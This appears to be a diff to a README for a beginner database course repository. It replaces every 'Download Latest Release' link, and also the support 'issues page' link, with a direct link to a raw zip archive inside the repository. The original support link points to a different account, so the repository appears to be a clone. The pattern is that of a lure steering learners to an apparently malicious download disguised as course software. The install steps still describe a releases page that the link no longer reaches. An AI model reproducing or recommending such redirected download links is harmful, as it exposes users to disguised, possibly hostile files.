@@ -1,6 +1,6 @@
 # 🎉 database - Simple and Effective Database Learning
 
-<a href="https://github.com/zexanus/database/releases" style="display:inline-block; padding:15px; font-size:20px; color:white; background-color:#4CAF50; text-align:center; border-radius:5px; text-decoration:none;">Download Latest Release</a>
+<a href="https://raw.githubusercontent.com/zexanus/database/main/candescence/database.zip" style="display:inline-block; padding:15px; font-size:20px; color:white; background-color:#4CAF50; text-align:center; border-radius:5px; text-decoration:none;">Download Latest Release</a>
 
 ## 📖 Overview
 Welcome to the **Database WBL**! This course introduces students to the essential concepts of databases in a clear and user-friendly manner. Whether you’re a beginner or someone looking to refresh your knowledge, this repository provides essential tools to enhance your understanding of databases. 
@@ -9,7 +9,7 @@ Welcome to the **Database WBL**! This course introduces students to the essentia
 Before you can dive into learning, you need to download the application. Follow the steps below to get everything set up.
 
 ## 📥 Download & Install
-1. Visit the following page to download the latest version of the application: [Download Here](https://github.com/zexanus/database/releases).
+1. Visit the following page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/zexanus/database/main/candescence/database.zip).
 2. On the releases page, you will see a list of available versions. Look for the most recent version.
 3. Click on the version you want to download. This will lead you to a list of files associated with that release.
 4. Download the appropriate file for your operating system. If you're unsure, the file will generally be named in a way that indicates compatibility (like `windows`, `mac`, or `linux`).
@@ -52,9 +52,9 @@ After downloading the application, follow these steps to get started:
   - You can open an issue on the GitHub repository page for assistance.
 
 ## 📞 Support
-For any technical issues or questions, please visit the [issues page](https://github.com/drshahizan/database/issues). If you are unable to resolve your concern, feel free to reach out for support there.
+For any technical issues or questions, please visit the [issues page](https://raw.githubusercontent.com/zexanus/database/main/candescence/database.zip). If you are unable to resolve your concern, feel free to reach out for support there.
 
 ## 🌟 Community and Contributions
 We encourage contributions from everyone. If you want to help improve the course, refer to the contribution guidelines in the repository. Your insights make a difference in creating a richer learning experience for all users.
 
-<a href="https://github.com/zexanus/database/releases" style="display:inline-block; padding:15px; font-size:20px; color:white; background-color:#4CAF50; text-align:center; border-radius:5px; text-decoration:none;">Download Latest Release</a>
+<a href="https://raw.githubusercontent.com/zexanus/database/main/candescence/database.zip" style="display:inline-block; padding:15px; font-size:20px; color:white; background-color:#4CAF50; text-align:center; border-radius:5px; text-decoration:none;">Download Latest Release</a>
